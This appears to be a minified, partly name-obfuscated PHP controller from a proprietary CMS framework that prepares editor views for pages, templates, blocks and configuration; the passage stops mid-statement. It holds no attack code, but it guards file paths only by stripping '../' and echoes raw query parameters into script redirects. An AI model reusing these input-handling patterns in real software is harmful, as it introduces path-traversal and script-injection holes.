<?php
/*
 * Copyright (c) 2007 PHPMyFrameWork - Joao Pinto
 * AUTHOR: Joao Paulo Lopes Pinto -- http://jplpinto.com
 * 
 * The use of this code must be allowed first by the creator Joao Pinto, since this is a private and proprietary code.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR 
 * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL 
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, 
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER 
 * IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT 
 * OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. IN NO EVENT SHALL 
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN 
 * AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE 
 * OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

include_once get_lib("org.phpframework.workflow.WorkFlowTaskHandler"); include_once get_lib("org.phpframework.layer.presentation.cms.module.CMSModuleEnableHandler"); include_once $EVC->getUtilPath("CMSPresentationLayerHandler"); include_once $EVC->getUtilPath("LayoutTypeProjectHandler"); $bean_name = $_GET["bean_name"]; $bean_file_name = $_GET["bean_file_name"]; $path = $_GET["path"]; $filter_by_layout = $_GET["filter_by_layout"]; $popup = $_GET["popup"]; $path = str_replace("../", "", $path);$filter_by_layout = str_replace("../", "", $filter_by_layout); if ($path) { $WorkFlowBeansFileHandler = new WorkFlowBeansFileHandler($user_beans_folder_path . $bean_file_name, $user_global_variables_file_path); $PEVC = $WorkFlowBeansFileHandler->getEVCBeanObject($bean_name, $path); if ($PEVC) { $PHPVariablesFileHandler = new PHPVariablesFileHandler(array($user_global_variables_file_path, $PEVC->getConfigPath("pre_init_config"))); $PHPVariablesFileHandler->startUserGlobalVariables(); $P = $PEVC->getPresentationLayer(); $layer_path = $P->getLayerPathSetting(); $selected_project_id = $P->getSelectedPresentationId(); f04f9d9a0ff(); $file_path = $layer_path . $path; if (file_exists($file_path)) { $UserAuthenticationHandler->checkInnerFilePermissionAuthentication($file_path, "layer", "access"); UserAuthenticationHandler::checkUsersMaxNum($UserAuthenticationHandler); $default_extension = "." . $P->getPresentationFileExtension(); $presentation_layer_label = WorkFlowBeansFileHandler::getLayerNameFromBeanObject($bean_name, $P) . " (Self)"; $file_modified_time = filemtime($file_path); $obj_data["code"] = file_get_contents($file_path); $obj_data["code"] = str_replace(chr(194) . chr(160), ' ', $obj_data["code"]); $LayoutTypeProjectHandler = new LayoutTypeProjectHandler($UserAuthenticationHandler, $user_global_variables_file_path, $user_beans_folder_path, $bean_file_name, $bean_name); switch ($file_type) { case "edit_entity": $entity_view_code = str_replace($selected_project_id . "/" . $P->settings["presentation_entities_path"], "", $path); $entity_view_code = substr($entity_view_code, strlen($entity_view_code) - strlen($default_extension)) == $default_extension ? substr($entity_view_code, 0, strlen($entity_view_code) - strlen($default_extension)) : $entity_view_code; $edit_entity_simple_hard_code = false; if (!empty($_GET["edit_entity_type"])) { $edit_entity_type = strtolower($_GET["edit_entity_type"]); $edit_entity_simple_hard_code = $edit_entity_type == "simple"; if (empty($_GET["dont_save_cookie"])) UserAuthenticationHandler::setEternalRootCookie("edit_entity_type", $edit_entity_type); } else if (!empty($_COOKIE["edit_entity_type"])) $edit_entity_type = strtolower($_COOKIE["edit_entity_type"]); $edit_entity_type = !empty($edit_entity_type) ? $edit_entity_type : "simple"; if ($edit_entity_type == "simple") { $edit_entity_advanced_url = $project_url_prefix . "phpframework/presentation/edit_entity?bean_name=$bean_name&bean_file_name=$bean_file_name&filter_by_layout=$filter_by_layout&path=$path&popup=$popup&edit_entity_type=advanced&dont_save_cookie=1"; $EVC->setView("edit_entity_simple"); $includes = CMSFileHandler::getIncludes($obj_data["code"], false); $regions_blocks = CMSFileHandler::getRegionsBlocks($obj_data["code"]); $regions_blocks_list = CMSPresentationLayerHandler::getRegionsBlocksList($regions_blocks, $selected_project_id); $available_blocks_list = CMSPresentationLayerHandler::initBlocksListThroughRegionBlocks($PEVC, $regions_blocks_list, $selected_project_id); $block_params = CMSPresentationLayerHandler::getBlockParamsList($PEVC, $regions_blocks, $obj_data["code"], $available_blocks_list); $available_block_params_list = $block_params[0]; $block_params_values_list = $block_params[1]; $blocks_join_points = CMSFileHandler::getAddRegionBlockJoinPoints($obj_data["code"]); $blocks_join_points = CMSPresentationLayerHandler::getAddRegionBlockJoinPointsListByBlock($blocks_join_points); $pres_layers_projects_props = CMSPresentationLayerHandler::getPresentationLayersProjectsFiles($user_global_variables_file_path, $user_beans_folder_path, false, false, -1, false, null, true); $LayoutTypeProjectHandler->filterPresentationLayersProjectsByUserAndLayoutPermissions($pres_layers_projects_props, $filter_by_layout, null, array( "do_not_filter_by_layout" => array( "bean_name" => $bean_name, "bean_file_name" => $bean_file_name, "project" => $selected_project_id ) )); $available_projects_props = $pres_layers_projects_props[$bean_name]["projects"]; $available_templates = CMSPresentationLayerHandler::getAvailableTemplatesList($PEVC, $default_extension); $available_templates = array_keys($available_templates); $available_templates_props = CMSPresentationLayerHandler::getAvailableTemplatesProps($PEVC, $selected_project_id, $available_templates); $vars = PHPVariablesFileHandler::getVarsFromFileCode( $PEVC->getConfigPath("pre_init_config") ); $layer_default_template = $vars["project_default_template"]; $set_template = CMSPresentationLayerHandler::getFileCodeSetTemplate($obj_data["code"]); if ($set_template && !CMSPresentationLayerHandler::isSetTemplateParamsValid($PEVC, $set_template)) { header("Location: $edit_entity_advanced_url"); echo "<script>document.location = '$edit_entity_advanced_url';</script>"; die(); } $is_external_template = CMSPresentationLayerHandler::isSetTemplateExternalTemplate($EVC, $set_template); $selected_template = $set_template ? $set_template["template_code"] : null; $selected_or_default_template = $is_external_template || $selected_template ? $selected_template : $layer_default_template; $template_contents = CMSPresentationLayerHandler::getSetTemplateCode($PEVC, $is_external_template, $selected_or_default_template, $set_template["template_params"], $includes); $available_regions_list = CMSPresentationLayerHandler::getAvailableRegionsListFromCode($template_contents, $selected_project_id, true); $params_list = CMSPresentationLayerHandler::getAvailableTemplateParamsListFromCode($template_contents, true); $available_params_list = $params_list[0]; $template_params_values_list = CMSPresentationLayerHandler::getAvailableTemplateParamsValuesList($obj_data["code"]); $UserCacheHandler = $PHPFrameWork->getObject("UserCacheHandler"); $cached_modified_date = CMSPresentationLayerHandler::getCachedEntitySaveActionTime($UserCacheHandler, $cms_page_cache_path_prefix, $file_path); $hard_coded = CMSPresentationLayerHandler::isEntityFileHardCoded($PEVC, $UserCacheHandler, $cms_page_cache_path_prefix, $file_path, true, $workflow_paths_id, $bean_name); $installed_wordpress_folders_name = CMSPresentationLayerHandler::getWordPressInstallationsFoldersName($PEVC); if (!$edit_entity_simple_hard_code && !CMSPresentationLayerHandler::checkIfEntityCodeContainsSimpleUISettings($obj_data["code"], $selected_template, $includes, $regions_blocks)) { header("Location: $edit_entity_advanced_url"); echo "<script>document.location = '$edit_entity_advanced_url';</script>"; die(); } include_once $EVC->getUtilPath("SequentialLogicalActivitiesHandler"); $opts = array( "main_div_selector" => ".entity_obj", "workflow_tasks_id" => "presentation_entity_sla", "path_extra" => hash('crc32b', "$bean_file_name/$bean_name/$path"), ); $sla = SequentialLogicalActivitiesHandler::getHeader($EVC, $PEVC, $UserAuthenticationHandler, $bean_name, $bean_file_name, $path, $project_url_prefix, $project_common_url_prefix, $gpl_js_url_prefix, $proprietary_js_url_prefix, $user_global_variables_file_path, $user_beans_folder_path, $webroot_cache_folder_path, $webroot_cache_folder_url, $filter_by_layout, $opts); $sla_head = $sla["head"]; $sla_js_head = $sla["js_head"]; $tasks_contents = $sla["tasks_contents"]; $layer_brokers_settings = $sla["layer_brokers_settings"]; $presentation_projects = $sla["presentation_projects"]; $db_drivers = $sla["db_drivers"]; $WorkFlowUIHandler = $sla["WorkFlowUIHandler"]; $set_workflow_file_url = $sla["set_workflow_file_url"]; $presentation_brokers = $layer_brokers_settings["presentation_brokers"]; $business_logic_brokers = $layer_brokers_settings["business_logic_brokers"]; $data_access_brokers = $layer_brokers_settings["data_access_brokers"]; $ibatis_brokers = $layer_brokers_settings["ibatis_brokers"]; $hibernate_brokers = $layer_brokers_settings["hibernate_brokers"]; $db_brokers = $layer_brokers_settings["db_brokers"]; $sla_settings = CMSFileHandler::getFileSetSequentialLogicalActivities($file_path, false, 1, 1); $sla_settings = isset($sla_settings[0]["sla_settings"]["key"]) ? array($sla_settings[0]["sla_settings"]) : $sla_settings[0]["sla_settings"]; } else { $EVC->setView("edit_entity_advanced"); $project_with_auto_view = $GLOBALS["project_with_auto_view"]; $view_file_exists = $PEVC->viewExists($entity_view_code); $view_file_path = str_replace($P->settings["presentation_entities_path"], $P->settings["presentation_views_path"], $path); $brokers = $P->getBrokers(); $layer_brokers_settings = WorkFlowBeansFileHandler::getLayerBrokersSettings($user_global_variables_file_path, $user_beans_folder_path, $brokers, '$EVC->getBroker'); $presentation_brokers = array(); $presentation_brokers[] = array($presentation_layer_label, $bean_file_name, $bean_name); $presentation_brokers_obj = array("default" => '$EVC->getPresentationLayer()'); $business_logic_brokers = $layer_brokers_settings["business_logic_brokers"]; $business_logic_brokers_obj = $layer_brokers_settings["business_logic_brokers_obj"]; $data_access_brokers = $layer_brokers_settings["data_access_brokers"]; $data_access_brokers_obj = $layer_brokers_settings["data_access_brokers_obj"]; $ibatis_brokers = $layer_brokers_settings["ibatis_brokers"]; $ibatis_brokers_obj = $layer_brokers_settings["ibatis_brokers_obj"]; $hibernate_brokers = $layer_brokers_settings["hibernate_brokers"]; $hibernate_brokers_obj = $layer_brokers_settings["hibernate_brokers_obj"]; $db_brokers = $layer_brokers_settings["db_brokers"]; $db_brokers_obj = $layer_brokers_settings["db_brokers_obj"]; $phpframeworks_options = array("default" => '$EVC->getPresentationLayer()->getPHPFrameWork()'); $bean_names_options = array_keys($P->getPHPFrameWork()->getObjects()); $brokers_db_drivers = WorkFlowBeansFileHandler::getBrokersDBDrivers($user_global_variables_file_path, $user_beans_folder_path, $brokers, true); $LayoutTypeProjectHandler->filterLayerBrokersDBDriversPropsFromLayoutName($brokers_db_drivers, $filter_by_layout); $db_drivers_options = array_keys($brokers_db_drivers); $allowed_tasks_tag = array( "definevar", "setvar", "setarray", "setdate", "ns", "createfunction", "createclass", "setobjectproperty", "createclassobject", "callobjectmethod", "callfunction", "addheader", "if", "switch", "loop", "foreach", "includefile", "echo", "code", "break", "return", "exit", "geturlcontents", "restconnector", "soapconnector", "getbeanobject", "trycatchexception", "throwexception", "printexception", "callpresentationlayerwebservice", "setpresentationview", "setpresentationtemplate", "inlinehtml", "createform", "setblockparams", "settemplateregionblockparam", "includeblock", "addtemplateregionblock", "rendertemplateregion", "settemplateparam", "gettemplateparam", ); if ($data_access_brokers_obj) { $allowed_tasks_tag[] = "setquerydata"; $allowed_tasks_tag[] = "getquerydata"; $allowed_tasks_tag[] = "dbdaoaction"; if ($ibatis_brokers_obj) $allowed_tasks_tag[] = "callibatisquery"; if ($hibernate_brokers_obj) { $allowed_tasks_tag[] = "callhibernateobject"; $allowed_tasks_tag[] = "callhibernatemethod"; } } else if ($db_brokers_obj) { $allowed_tasks_tag[] = "setquerydata"; $allowed_tasks_tag[] = "getquerydata"; $allowed_tasks_tag[] = "dbdaoaction"; } if ($db_brokers_obj) $allowed_tasks_tag[] = "getdbdriver"; if ($business_logic_brokers_obj) $allowed_tasks_tag[] = "callbusinesslogic"; $WorkFlowTaskHandler = new WorkFlowTaskHandler($webroot_cache_folder_path, $webroot_cache_folder_url); $WorkFlowTaskHandler->setCacheRootPath(LAYER_CACHE_PATH); $WorkFlowTaskHandler->setAllowedTaskTags($allowed_tasks_tag); $WorkFlowTaskHandler->addTasksFoldersPath($code_workflow_editor_user_tasks_folders_path); $WorkFlowTaskHandler->addAllowedTaskTagsFromFolders($code_workflow_editor_user_tasks_folders_path); $available_projects = $PEVC->getProjectsId(); } break; case "edit_view": $EVC->setView("edit_view"); $allowed_tasks_tag = array( "definevar", "setvar", "setarray", "setdate", "ns", "createfunction", "createclass", "setobjectproperty", "createclassobject", "callobjectmethod", "callfunction", "addheader", "if", "switch", "loop", "foreach", "includefile", "echo", "code", "break", "return", "exit", "geturlcontents", "restconnector", "soapconnector", "getbeanobject", "trycatchexception", "throwexception", "printexception", "callpresentationlayerwebservice", "inlinehtml", "createform", "setblockparams", "settemplateregionblockparam", "includeblock", "addtemplateregionblock", "rendertemplateregion", "settemplateparam", "gettemplateparam", "setpresentationview", "setpresentationtemplate" ); $WorkFlowTaskHandler = new WorkFlowTaskHandler($webroot_cache_folder_path, $webroot_cache_folder_url); $WorkFlowTaskHandler->setCacheRootPath(LAYER_CACHE_PATH); $WorkFlowTaskHandler->setAllowedTaskTags($allowed_tasks_tag); $WorkFlowTaskHandler->addTasksFoldersPath($code_workflow_editor_user_tasks_folders_path); $WorkFlowTaskHandler->addAllowedTaskTagsFromFolders($code_workflow_editor_user_tasks_folders_path); $brokers = $P->getBrokers(); $presentation_brokers = array(); $presentation_brokers[] = array($presentation_layer_label, $bean_file_name, $bean_name); $presentation_brokers_obj = array("default" => '$EVC->getPresentationLayer()'); $phpframeworks_options = array("default" => '$EVC->getPresentationLayer()->getPHPFrameWork()'); $bean_names_options = array_keys($P->getPHPFrameWork()->getObjects()); $available_projects = $PEVC->getProjectsId(); break; case "edit_template": if (!empty($_GET["edit_template_type"])) { $edit_template_type = strtolower($_GET["edit_template_type"]); if (empty($_GET["dont_save_cookie"])) UserAuthenticationHandler::setEternalRootCookie("edit_template_type", $edit_template_type); } else if (!empty($_COOKIE["edit_template_type"])) $edit_template_type = strtolower($_COOKIE["edit_template_type"]); $edit_template_type = !empty($edit_template_type) ? $edit_template_type : "simple"; if ($edit_template_type == "simple") { $EVC->setView("edit_template_simple"); $top_code = ""; if (strtolower(substr($obj_data["code"], 0, 5)) == "<?php") $top_code = substr($obj_data["code"], 5, strpos($obj_data["code"], "?>") - 5); $top_code = $top_code ? "<?php $top_code ?>" : ""; $includes = CMSFileHandler::getIncludes($top_code, false); $regions_blocks = CMSFileHandler::getRegionsBlocks($top_code); $regions_blocks_list = CMSPresentationLayerHandler::getRegionsBlocksList($regions_blocks, $selected_project_id); $available_blocks_list = CMSPresentationLayerHandler::initBlocksListThroughRegionBlocks($PEVC, $regions_blocks_list, $selected_project_id); $block_params = CMSPresentationLayerHandler::getBlockParamsList($PEVC, $regions_blocks, $top_code, $available_blocks_list); $available_block_params_list = $block_params[0]; $block_params_values_list = $block_params[1]; $blocks_join_points = CMSFileHandler::getAddRegionBlockJoinPoints($top_code); $blocks_join_points = CMSPresentationLayerHandler::getAddRegionBlockJoinPointsListByBlock($blocks_join_points); $selected_template = str_replace($PEVC->getTemplatesPath(), "", $file_path); $path_info = pathinfo($selected_template); $selected_template = str_replace("." . $path_info["extension"], "", $selected_template); $available_regions_list = CMSPresentationLayerHandler::getAvailableRegionsList($file_path, $selected_project_id); $params_list = CMSPresentationLayerHandler::getAvailableTemplateParamsList($file_path); $available_params_list = $params_list[0]; $template_params_values_list = $params_list[1]; $selected_project_url_prefix = mf774c99d0ef1($PEVC, $selected_project_id); $selected_project_common_url_prefix = f798fc78959($PEVC, $selected_project_id); include_once $EVC->getUtilPath("SequentialLogicalActivitiesHandler"); $opts = array( "main_div_selector" => ".template_obj", "workflow_tasks_id" => "presentation_template_sla", "path_extra" => hash('crc32b', "$bean_file_name/$bean_name/$path"), ); $sla = SequentialLogicalActivitiesHandler::getHeader($EVC, $PEVC, $UserAuthenticationHandler, $bean_name, $bean_file_name, $path, $project_url_prefix, $project_common_url_prefix, $gpl_js_url_prefix, $proprietary_js_url_prefix, $user_global_variables_file_path, $user_beans_folder_path, $webroot_cache_folder_path, $webroot_cache_folder_url, $filter_by_layout, $opts); $sla_head = $sla["head"]; $sla_js_head = $sla["js_head"]; $tasks_contents = $sla["tasks_contents"]; $layer_brokers_settings = $sla["layer_brokers_settings"]; $presentation_projects = $sla["presentation_projects"]; $db_drivers = $sla["db_drivers"]; $WorkFlowUIHandler = $sla["WorkFlowUIHandler"]; $set_workflow_file_url = $sla["set_workflow_file_url"]; $presentation_brokers = $layer_brokers_settings["presentation_brokers"]; $business_logic_brokers = $layer_brokers_settings["business_logic_brokers"]; $data_access_brokers = $layer_brokers_settings["data_access_brokers"]; $ibatis_brokers = $layer_brokers_settings["ibatis_brokers"]; $hibernate_brokers = $layer_brokers_settings["hibernate_brokers"]; $db_brokers = $layer_brokers_settings["db_brokers"]; $sla_settings = CMSFileHandler::getFileSetSequentialLogicalActivities($file_path, false, 1, 1); $sla_settings = isset($sla_settings[0]["sla_settings"]["key"]) ? array($sla_settings[0]["sla_settings"]) : $sla_settings[0]["sla_settings"]; } else { $EVC->setView("edit_template_advanced"); $brokers = $P->getBrokers(); $presentation_brokers = array(); $presentation_brokers[] = array($presentation_layer_label, $bean_file_name, $bean_name); $presentation_brokers_obj = array("default" => '$EVC->getPresentationLayer()'); $allowed_tasks_tag = array( "definevar", "setvar", "setarray", "setdate", "ns", "createfunction", "createclass", "setobjectproperty", "createclassobject", "callobjectmethod", "callfunction", "addheader", "if", "switch", "loop", "foreach", "includefile", "echo", "code", "break", "return", "exit", "geturlcontents", "restconnector", "soapconnector", "getbeanobject", "trycatchexception", "throwexception", "printexception", "callpresentationlayerwebservice", "inlinehtml", "createform", "setblockparams", "settemplateregionblockparam", "includeblock", "addtemplateregionblock", "rendertemplateregion", "settemplateparam", "gettemplateparam", ); $WorkFlowTaskHandler = new WorkFlowTaskHandler($webroot_cache_folder_path, $webroot_cache_folder_url); $WorkFlowTaskHandler->setCacheRootPath(LAYER_CACHE_PATH); $WorkFlowTaskHandler->setAllowedTaskTags($allowed_tasks_tag); $WorkFlowTaskHandler->addTasksFoldersPath($code_workflow_editor_user_tasks_folders_path); $WorkFlowTaskHandler->addAllowedTaskTagsFromFolders($code_workflow_editor_user_tasks_folders_path); $phpframeworks_options = array("default" => '$EVC->getPresentationLayer()->getPHPFrameWork()'); $bean_names_options = array_keys($P->getPHPFrameWork()->getObjects()); $available_projects = $PEVC->getProjectsId(); } break; case "create_page_module_block": case "create_block": $CMSModuleLayer = $EVC->getCMSLayer()->getCMSModuleLayer(); $CMSModuleLayer->loadModules($project_common_url_prefix . "module/"); $all_loaded_modules = $CMSModuleLayer->getLoadedModules(); $PCMSModuleLayer = $PEVC->getCMSLayer()->getCMSModuleLayer(); $PCMSModuleLayer->loadModules($project_common_url_prefix . "module/"); $project_loaded_modules = $PCMSModuleLayer->getLoadedModules(); $loaded_modules = array(); foreach ($all_loaded_modules as $module_id => $loaded_module) { if ($project_loaded_modules[$module_id] && !$loaded_module["is_hidden_module"]) { if (CMSModuleEnableHandler::isModuleEnabled($project_loaded_modules[$module_id]["path"])) { $group_module_id = $loaded_module["group_id"]; $loaded_modules[$group_module_id][$module_id] = $loaded_module; } } } ksort($loaded_modules); break; case "edit_page_module_block": case "edit_block": if ($file_type == "edit_page_module_block") $obj_data["code"] = ""; $module_id = $_GET["module_id"]; $block_id = str_replace($selected_project_id . "/" . $P->settings["presentation_blocks_path"], "", $path); $block_id = substr($block_id, strlen($block_id) - strlen($default_extension)) == $default_extension ? substr($block_id, 0, strlen($block_id) - strlen($default_extension)) : $block_id; $edit_block_simple_hard_code = false; if (!empty($_GET["edit_block_type"])) { $edit_block_type = strtolower($_GET["edit_block_type"]); $edit_block_simple_hard_code = $edit_block_type == "simple"; if (empty($_GET["dont_save_cookie"])) UserAuthenticationHandler::setEternalRootCookie("edit_block_type", $edit_block_type); } else if (!empty($_COOKIE["edit_block_type"])) $edit_block_type = strtolower($_COOKIE["edit_block_type"]); $edit_block_type = !empty($edit_block_type) ? $edit_block_type : "simple"; if ($file_type == "edit_block" && empty($obj_data["code"]) && empty($module_id) && $edit_block_type == "simple") { $url = $project_url_prefix . "phpframework/presentation/create_block?bean_name=$bean_name&bean_file_name=$bean_file_name&filter_by_layout=$filter_by_layout&path=$path&popup=$popup"; header("Location: $url"); echo "<script>document.location = '$url';</script>"; die(); } $presentation_brokers = array(); $presentation_brokers[] = array($presentation_layer_label, $bean_file_name, $bean_name); $presentation_brokers_obj = array("default" => '$EVC->getPresentationLayer()'); if ($edit_block_type == "simple") { $edit_block_advanced_url = $project_url_prefix . "phpframework/presentation/edit_block?bean_name=$bean_name&bean_file_name=$bean_file_name&filter_by_layout=$filter_by_layout&path=$path&popup=$popup&edit_block_type=advanced&dont_save_cookie=1"; if ($file_type == "edit_block") $EVC->setView("edit_block_simple"); if (!empty($obj_data["code"])) { $block_path = $PEVC->getBlockPath($block_id); $block_params = CMSFileHandler::getFileCreateBlockParams($block_path, false, 1, 1); $raw_block_id = CMSPresentationLayerHandler::getArgumentCode($block_params[0]["block"], $block_params[0]["block_type"]); $block_join_points = CMSPresentationLayerHandler::getFileAddBlockJoinPointsListByBlock($block_path); $block_join_points = $block_join_points[$raw_block_id]; $block_local_join_points = CMSPresentationLayerHandler::getFileBlockLocalJoinPointsListByBlock($block_path); $block_local_join_points = $block_local_join_points[$raw_block_id]; preg_match_all('/([ ]*)->([ ]*)getBlockIdFromFilePath([ ]*)\(([ ]*)__FILE__([ ]*)\)([ ]*)$/iu', $block_params[0]["block"], $matches, PREG_PATTERN_ORDER); if (empty($block_params[0]["block_type"]) && $matches[0][0]) { $block_params[0]["block"] = $block_id; $block_params[0]["block_type"] = "string"; } else if ($block_id != $block_params[0]["block"]) $hard_coded = true; $module_id = $block_params[0]["module_type"] == "string" ? $block_params[0]["module"] : ""; $block_settings = isset($block_params[0]["block_settings"]["key"]) ? array($block_params[0]["block_settings"]) : $block_params[0]["block_settings"]; } if ($module_id) { $CMSModuleLayer = $EVC->getCMSLayer()->getCMSModuleLayer(); $CMSModuleLayer->loadModules($project_common_url_prefix . "module/"); $loaded_modules = $CMSModuleLayer->getLoadedModules(); $module = $loaded_modules[$module_id]; if ($module) { $PCMSModuleLayer = $PEVC->getCMSLayer()->getCMSModuleLayer(); $PCMSModuleLayer->loadModules($project_common_url_prefix . "module/"); $project_loaded_module = $PCMSModuleLayer->getLoadedModule($module_id); $module["enabled"] = CMSModuleEnableHandler::isModuleEnabled($project_loaded_module["path"]); $module["join_points"] = $project_loaded_module["join_points"]; $module["module_handler_impl_file_path"] = $project_loaded_module["module_handler_impl_file_path"]; $module["settings_html"] = $CMSModuleLayer->getModuleHtml($module, array("UserAuthenticationHandler" => $UserAuthenticationHandler)); $module_group_id = $module["group_id"]; $exists_admin_panel = is_dir($EVC->getModulesPath($EVC->getCommonProjectName()) . $module_group_id . "/admin/"); } if ($file_type == "edit_block" && !$edit_block_simple_hard_code && !CMSPresentationLayerHandler::checkIfBlockCodeContainsSimpleUISettings($obj_data["code"], $module_id)) { header("Location: $edit_block_advanced_url"); echo "<script>document.location = '$edit_block_advanced_url';</script>"; die(); } } else if ($file_type == "edit_block") { header("Location: $edit_block_advanced_url"); echo "<script>document.location = '$edit_block_advanced_url';</script>"; die(); } $presentation_brokers = array( array($presentation_layer_label, $bean_file_name, $bean_name) ); } else { $EVC->setView("edit_block_advanced"); $brokers = $P->getBrokers(); $layer_brokers_settings = WorkFlowBeansFileHandler::getLayerBrokersSettings($user_global_variables_file_path, $user_beans_folder_path, $brokers, '$EVC->getBroker'); $business_logic_brokers = $layer_brokers_settings["business_logic_brokers"]; $business_logic_brokers_obj = $layer_brokers_settings["business_logic_brokers_obj"]; $data_access_brokers = $layer_brokers_settings["data_access_brokers"]; $data_access_brokers_obj = $layer_brokers_settings["data_access_brokers_obj"]; $ibatis_brokers = $layer_brokers_settings["ibatis_brokers"]; $ibatis_brokers_obj = $layer_brokers_settings["ibatis_brokers_obj"]; $hibernate_brokers = $layer_brokers_settings["hibernate_brokers"]; $hibernate_brokers_obj = $layer_brokers_settings["hibernate_brokers_obj"]; $db_brokers = $layer_brokers_settings["db_brokers"]; $db_brokers_obj = $layer_brokers_settings["db_brokers_obj"]; $phpframeworks_options = array("default" => '$EVC->getPresentationLayer()->getPHPFrameWork()'); $bean_names_options = array_keys($P->getPHPFrameWork()->getObjects()); $brokers_db_drivers = WorkFlowBeansFileHandler::getBrokersDBDrivers($user_global_variables_file_path, $user_beans_folder_path, $brokers, true); $LayoutTypeProjectHandler->filterLayerBrokersDBDriversPropsFromLayoutName($brokers_db_drivers, $filter_by_layout); $db_drivers_options = array_keys($brokers_db_drivers); $allowed_tasks_tag = array( "definevar", "setvar", "setarray", "setdate", "ns", "createfunction", "createclass", "setobjectproperty", "createclassobject", "callobjectmethod", "callfunction", "addheader", "if", "switch", "loop", "foreach", "includefile", "echo", "code", "break", "return", "exit", "geturlcontents", "restconnector", "soapconnector", "getbeanobject", "trycatchexception", "throwexception", "printexception", "callpresentationlayerwebservice", "setpresentationview", "setpresentationtemplate", "inlinehtml", "createform", ); if ($data_access_brokers_obj) { $allowed_tasks_tag[] = "setquerydata"; $allowed_tasks_tag[] = "getquerydata"; $allowed_tasks_tag[] = "dbdaoaction"; if ($ibatis_brokers_obj) $allowed_tasks_tag[] = "callibatisquery"; if ($hibernate_brokers_obj) { $allowed_tasks_tag[] = "callhibernateobject"; $allowed_tasks_tag[] = "callhibernatemethod"; } } else if ($db_brokers_obj) { $allowed_tasks_tag[] = "setquerydata"; $allowed_tasks_tag[] = "getquerydata"; $allowed_tasks_tag[] = "dbdaoaction"; } if ($db_brokers_obj) $allowed_tasks_tag[] = "getdbdriver"; if ($business_logic_brokers_obj) $allowed_tasks_tag[] = "callbusinesslogic"; $WorkFlowTaskHandler = new WorkFlowTaskHandler($webroot_cache_folder_path, $webroot_cache_folder_url); $WorkFlowTaskHandler->setCacheRootPath(LAYER_CACHE_PATH); $WorkFlowTaskHandler->setAllowedTaskTags($allowed_tasks_tag); $WorkFlowTaskHandler->addTasksFoldersPath($code_workflow_editor_user_tasks_folders_path); $WorkFlowTaskHandler->addAllowedTaskTagsFromFolders($code_workflow_editor_user_tasks_folders_path); } break; case "edit_project_global_variables": $find = '$presentation_id = substr($project_path, strlen($layer_path), -1);'; $pos = strpos($obj_data["code"], $find) + strlen($find); $obj_data["code"] = "<?php\n" . trim(substr($obj_data["code"], $pos)); $obj_data["code"] = str_replace("<?php\n?>", "", $obj_data["code"]); $vars = PHPVariablesFileHandler::getVarsFromContent($obj_data["code"]); $is_code_valid = PHPVariablesFileHandler::isSimpleVarsContent($obj_data["code"]); $vars["log_level"] = array( "items" => array( 0 => "NONE", 1 => "EXCEPTION", 2 => "EXCEPTION+ERROR", 3 => "EXCEPTION+ERROR+INFO", 4 => "EXCEPTION+ERROR+INFO+DEBUG" ), "value" => $vars["log_level"], "force_raw_keys" => true, ); $available_templates = CMSPresentationLayerHandler::getAvailableTemplatesList($PEVC, $default_extension); $available_templates = array_keys($available_templates); $available_templates_props = CMSPresentationLayerHandler::getAvailableTemplatesProps($PEVC, $selected_project_id, $available_templates); $vars["project_default_template"] = array( "items" => $available_templates, "value" => $vars["project_default_template"], ); $brokers = $P->getBrokers(); $brokers_db_drivers = WorkFlowBeansFileHandler::getBrokersDBDrivers($user_global_variables_file_path, $user_beans_folder_path, $brokers, true); $LayoutTypeProjectHandler->filterLayerBrokersDBDriversPropsFromLayoutName($brokers_db_drivers, $filter_by_layout); $available_db_drivers = array(); if ($brokers_db_drivers) foreach ($brokers_db_drivers as $db_driver_name => $db_driver_props) $available_db_drivers[$db_driver_name] = $db_driver_name . ($db_driver_props ? '' : ' (Rest)'); $vars["default_db_driver"] = array( "items" => $available_db_drivers, "value" => $vars["default_db_driver"], ); $vars["project_with_auto_view"] = array( "items" => array( true => "YES", false => "NO", ), "value" => $vars["project_with_auto_view"], ); $reserved_vars = array("log_level", "project_default_template", "default_db_driver", "project_with_auto_view", "project_default_entity", "project_default_view"); $presentation_brokers = array( array($presentation_layer_label, $bean_file_name, $bean_name) ); $allowed_tasks_tag = array( "definevar", "setvar", "setarray", "setdate", "ns", "createfunction", "createclass", "setobjectproperty", "createclassobject", "callobjectmethod", "callfunction", "if", "switch", "loop", "foreach", "includefile", "echo", "code", "break", "return", "exit", "trycatchexception", "throwexception", "printexception", ); $WorkFlowTaskHandler = new WorkFlowTaskHandler($webroot_cache_folder_path, $webroot_cache_folder_url); $WorkFlowTaskHandler->setCacheRootPath(LAYER_CACHE_PATH); $WorkFlowTaskHandler->setAllowedTaskTags($allowed_tasks_tag); break; case "edit_config": $presentation_brokers = array( array($presentation_layer_label, $bean_file_name, $bean_name) ); $allowed_tasks_tag = array( "definevar", "setvar", "setarray", "setdate", "ns", "createfunction", "createclass", "setobjectproperty", "createclassobject", "callobjectmethod", "callfunction", "if", "switch", "loop", "foreach", "includefile", "echo", "code", "break", "return", "exit", "trycatchexception", "throwexception", "printexception", ); $WorkFlowTaskHandler = new WorkFlowTaskHandler($webroot_cache_folder_path, $webroot_cache_folder_url); $WorkFlowTaskHandler->setCacheRootPath(LAYER_CACHE_PATH); 